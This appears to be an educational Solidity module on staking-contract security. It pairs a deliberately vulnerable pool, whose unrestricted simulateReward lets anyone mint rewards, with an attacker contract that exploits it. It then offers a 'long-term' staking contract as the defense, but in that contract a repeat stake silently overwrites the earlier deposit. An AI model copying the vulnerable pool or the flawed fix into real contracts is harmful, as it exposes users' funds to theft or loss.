// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title TLTModule - Think Long Term Smart Contract Security Module (Attack and Defense)

/// ------------------------------------
/// 🔓 Fast Staking Pool (Vulnerable)
/// ------------------------------------
contract FastStakingPool {
    mapping(address => uint256) public staked;
    mapping(address => uint256) public rewards;

    uint256 public rewardRate = 1e15; // 0.001 ETH per block

    function stake() external payable {
        staked[msg.sender] += msg.value;
    }

    function unstake() external {
        uint256 amt = staked[msg.sender];
        require(amt > 0, "Nothing");
        staked[msg.sender] = 0;
        payable(msg.sender).transfer(amt + rewards[msg.sender]);
        rewards[msg.sender] = 0;
    }

    function simulateReward(address user) external {
        rewards[user] += rewardRate;
    }

    receive() external payable {}
}

/// ------------------------------------
/// 🔓 Attacker: Stake → Reward → Unstake
/// ------------------------------------
interface IStakePool {
    function stake() external payable;
    function simulateReward(address) external;
    function unstake() external;
}

contract FastStakeAttacker {
    IStakePool public pool;

    constructor(address _pool) {
        pool = IStakePool(_pool);
    }

    function farmOnce() external payable {
        pool.stake{value: msg.value}();
        pool.simulateReward(address(this));
        pool.unstake();
    }

    receive() external payable {}
}

/// ------------------------------------
/// 🔐 Think Long Term Staking System
/// ------------------------------------
contract ThinkLongTermStaking {
    struct StakeInfo {
        uint256 amount;
        uint256 startTime;
        uint256 rewardClaimed;
        bool unstaked;
    }

    mapping(address => StakeInfo) public stakes;
    uint256 public baseRate = 1e15; // per second
    uint256 public lockPeriod = 1 days;
    uint256 public maxBoostTime = 30 days;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 payout);

    function stake() external payable {
        require(msg.value > 0, "Stake required");
        stakes[msg.sender] = StakeInfo(msg.value, block.timestamp, 0, false);
        emit Staked(msg.sender, msg.value);
    }

    function computeReward(address user) public view returns (uint256) {
        StakeInfo memory info = stakes[user];
        if (info.unstaked || info.amount == 0) return 0;

        uint256 held = block.timestamp - info.startTime;
        uint256 capped = held > maxBoostTime ? maxBoostTime : held;
        uint256 multiplier = (100 + (capped * 100) / maxBoostTime); // max 2x at full maturity

        return (info.amount * baseRate * held * multiplier) / (100 * 1 ether);
    }

    function unstake() external {
        StakeInfo storage info = stakes[msg.sender];
        require(!info.unstaked, "Already out");
        require(block.timestamp >= info.startTime + lockPeriod, "Still locked");

        uint256 payout = info.amount + computeReward(msg.sender);
        info.unstaked = true;
        payable(msg.sender).transfer(payout);
        emit Unstaked(msg.sender, payout);
    }

    receive() external payable {}
}
